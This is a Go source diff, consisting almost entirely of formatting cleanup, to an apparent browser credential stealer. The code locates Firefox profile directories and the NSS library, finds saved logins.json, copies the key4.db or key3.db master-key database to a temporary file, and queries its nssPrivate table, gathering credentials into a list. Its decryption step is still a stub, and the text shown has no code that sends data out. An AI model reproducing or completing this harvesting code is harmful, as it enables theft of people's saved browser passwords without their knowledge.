@@ -9,10 +9,10 @@ import (
 	_ "github.com/mattn/go-sqlite3"
 )
 
-var  (
+var (
 	FIREFOX_PROFILE_PATH = fmt.Sprintf("%s/Mozilla/Firefox/Profiles", APPDATA)
-	NSS_PATH = fmt.Sprintf("%s/Mozilla Firefox", PROGRAMFILES)
-	NSS_PATH_86 = fmt.Sprintf("%s (x86)/Mozilla Firefox", PROGRAMFILES)
+	NSS_PATH             = fmt.Sprintf("%s/Mozilla Firefox", PROGRAMFILES)
+	NSS_PATH_86          = fmt.Sprintf("%s (x86)/Mozilla Firefox", PROGRAMFILES)
 	// RequiredFiles = []string{ "key3.db", "key4.db", "logins.json" }
 )
 
@@ -29,14 +29,14 @@ func Firefox() BrowserConfig {
 	// next, decrypt the password
 	// next, add the credential to the credentials slice
 
-	nssPath, err := getNSSDLL();
+	nssPath, err := getNSSDLL()
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
 	}
 	fmt.Println(nssPath)
 
-	err = getMozLoginData(&credentials);
+	err = getMozLoginData(&credentials)
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
@@ -52,17 +52,17 @@ func getMozLoginData(credentials *BrowserConfig) error {
 		return err
 	}
 
-	finalErr := fmt.Errorf("profile not found");
+	finalErr := fmt.Errorf("profile not found")
 	for _, dir := range dirs {
 		profilePath := fmt.Sprintf("%s/%s", FIREFOX_PROFILE_PATH, dir.Name())
 		profileDir, err := os.ReadDir(profilePath)
 		if err != nil {
 			continue
 		}
-		
+
 		for _, file := range profileDir {
 			if file.Name() == "logins.json" {
-				finalErr = nil;
+				finalErr = nil
 				// nssDBArr, err := getNSSPrivate(profilePath);
 				// if err != nil {
 				// 	fmt.Println(err.Error())
@@ -70,22 +70,22 @@ func getMozLoginData(credentials *BrowserConfig) error {
 				// }
 
 				// fmt.Println(nssDBArr)
-				parseCredentials(profilePath, credentials);
-				break;
+				parseCredentials(profilePath, credentials)
+				break
 			}
 		}
 	}
-	return finalErr;
+	return finalErr
 }
 
-func getNSSDLL() (string, error) {	
+func getNSSDLL() (string, error) {
 	if _, err := os.Stat(NSS_PATH + "/nss3.dll"); err == nil {
-		return NSS_PATH, nil;
+		return NSS_PATH, nil
 	} else if _, err := os.Stat(NSS_PATH_86 + "/nss3.dll"); err == nil {
-		return NSS_PATH_86, nil;
+		return NSS_PATH_86, nil
 	} else {
-		fmt.Println("Firefox not found");
-		return "", fmt.Errorf("Firefox not found");
+		fmt.Println("Firefox not found")
+		return "", fmt.Errorf("Firefox not found")
 	}
 }
 
@@ -133,7 +133,7 @@ func parseCredentials(profilePath string, credentials *BrowserConfig) {
 		if err != nil {
 			fmt.Println(err.Error())
 		}
-		
+
 		// Add the credential to the credentials slice
 		credentials.Credentials = append(credentials.Credentials, Credential{
 			URL:      url,
@@ -142,27 +142,25 @@ func parseCredentials(profilePath string, credentials *BrowserConfig) {
 		})
 	}
 
-
 }
 
-
 type nssPrivate struct {
-	a11 string;
-	a102 string;
+	a11  string
+	a102 string
 }
 
 func getNSSPrivate(path string) ([]nssPrivate, error) {
-	var keyFile string;
+	var keyFile string
 	if _, err := os.Stat(path + "/key4.db"); err == nil {
-		keyFile = path + "/key4.db";
+		keyFile = path + "/key4.db"
 	} else if _, err := os.Stat(path + "/key3.db"); err == nil {
-		keyFile = path + "/key3.db";
+		keyFile = path + "/key3.db"
 	} else {
-		return nil, fmt.Errorf("key file not found");
+		return nil, fmt.Errorf("key file not found")
 	}
-	
+
 	// create temp file
-	tempFile, err := os.CreateTemp("", "firefox_key_*.db");
+	tempFile, err := os.CreateTemp("", "firefox_key_*.db")
 	if err != nil {
 		fmt.Println(err.Error())
 		return nil, err
@@ -170,18 +168,18 @@ func getNSSPrivate(path string) ([]nssPrivate, error) {
 	defer os.Remove(tempFile.Name())
 
 	// copy key file to temp file
-	fileBytes, err := os.ReadFile(keyFile);
+	fileBytes, err := os.ReadFile(keyFile)
 	if err != nil {
 		fmt.Println(err.Error())
 		return nil, err
 	}
-	err = os.WriteFile(tempFile.Name(), fileBytes, 0644);
+	err = os.WriteFile(tempFile.Name(), fileBytes, 0644)
 	if err != nil {
 		fmt.Println(err.Error())
 	}
 
 	// read sqlite3 database
-	db, err := sql.Open("sqlite3", tempFile.Name());
+	db, err := sql.Open("sqlite3", tempFile.Name())
 	if err != nil {
 		fmt.Println(err.Error())
 		return nil, err
@@ -196,28 +194,28 @@ func getNSSPrivate(path string) ([]nssPrivate, error) {
 	}
 
 	// Query the database for content of nssPrivate
-	rows, err := db.Query("SELECT a11, a102 FROM nssPrivate");
+	rows, err := db.Query("SELECT a11, a102 FROM nssPrivate")
 	if err != nil {
 		fmt.Println(err.Error())
 		return nil, err
 	}
 
 	// create list of objects for to store data
-	var nssDBArr []nssPrivate;
-	
+	var nssDBArr []nssPrivate
+
 	// Iterate over the rows
 	for rows.Next() {
-		var a11 string;
-		var a102 string;
+		var a11 string
+		var a102 string
 
-		err = rows.Scan(&a11, &a102);
+		err = rows.Scan(&a11, &a102)
 		if err != nil {
 			fmt.Println(err.Error())
 			continue
 		}
 
 		nssDBArr = append(nssDBArr, nssPrivate{
-			a11: a11,
+			a11:  a11,
 			a102: a102,
 		})
 	}
@@ -230,5 +228,5 @@ func decryptMozData(ciphertext string, profilePath string) (string, error) {
 		return "", nil
 	}
 
-	return ciphertext, nil;
+	return ciphertext, nil
 }
